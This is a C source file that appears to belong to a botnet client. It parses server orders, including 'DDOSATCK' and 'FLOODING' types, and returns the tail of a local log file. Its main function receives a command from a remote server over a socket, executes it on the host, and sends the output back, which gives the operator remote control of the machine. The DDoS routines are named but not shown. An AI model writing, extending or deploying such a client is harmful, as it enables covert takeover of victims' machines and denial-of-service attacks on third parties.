#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include "../../include/client/client_utils.h"
#include "../../include/logging.h"
#include "../../include/send_message.h"
#include "../../include/receive_message.h"
#include "../../include/commands.h"

// Check the 8 first characters of the buffer to check the order type
enum OrderType get_order_enum_type(const char *buffer) {
    char flag[9];
    strncpy(flag, buffer, 8); // Copy the first 8 characters
    flag[8] = '\0'; // Null-terminate the string

    if (strcmp(flag, "COMMAND_") == 0) return COMMAND_;
    if (strcmp(flag, "ASKLOGS_") == 0) return ASKLOGS_;
    if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
    if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
    if (strcmp(flag, "FLOODING") == 0) return FLOODING;
    return UNKNOWN;
}

// Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
char* read_client_log_file(int n_last_line) {
    FILE *file = fopen("main.log", "r");
    if (!file) {
        perror("Error while opening log file");
        return NULL;
    }

    char *buffer;

    if(n_last_line <= 0) {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file); // Cursor position, get file byte size
        fseek(file, 0, SEEK_SET);

        buffer = malloc(filesize + 1);
        size_t read_size = fread(buffer, 1, filesize, file); // read all the file
        buffer[read_size] = '\0';
    }
    else {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file);
        long pos = filesize - 1; // begin at the end of the file before \0
        int newline_count = 0;

        // getting the cursor position to begin reading the n_last_line lines of the file
        while (pos >= 0 && newline_count <= n_last_line) {
            fseek(file, pos, SEEK_SET);
            int c = fgetc(file);
            if (c == '\n') {
                newline_count++;
            }
            pos--;
        }
        long start_pos = pos + 1;
        fseek(file, start_pos, SEEK_SET);

        buffer = malloc(filesize + 1);
        long read_size = filesize - start_pos;
        fread(buffer, 1, filesize, file);
        buffer[read_size] = '\0';
    }

    fclose(file);
    return buffer;
}

int parse_and_execute_command(const char *raw_message, int sockfd) {
    Command cmd;
    deserialize_command((char *)raw_message, &cmd);

    // Execute command
    char result_buffer[4096] = {0};
    int exit_code = execute_command(&cmd, result_buffer, sizeof(result_buffer));

    // Send the result back to the server
    if (exit_code >= 0) {
        send_message(sockfd, result_buffer);
    } else {
        send_message(sockfd, "Command execution failed");
    }

    // Cleanup
    if (cmd.program) free(cmd.program);
    if (cmd.params) {
        for (size_t i = 0; cmd.params[i]; ++i) {
            free(cmd.params[i]);
        }
        free(cmd.params);
    }

    return exit_code;
}

void receive_and_process_message(int sockfd) {
    char buffer[1024];

    // Receive the message from the server
    if (receive_message_client(sockfd, buffer, sizeof(buffer)) < 0) {
        output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
        return;
    }

    output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);

    // Parse and execute the command
    parse_and_execute_command(buffer, sockfd);
}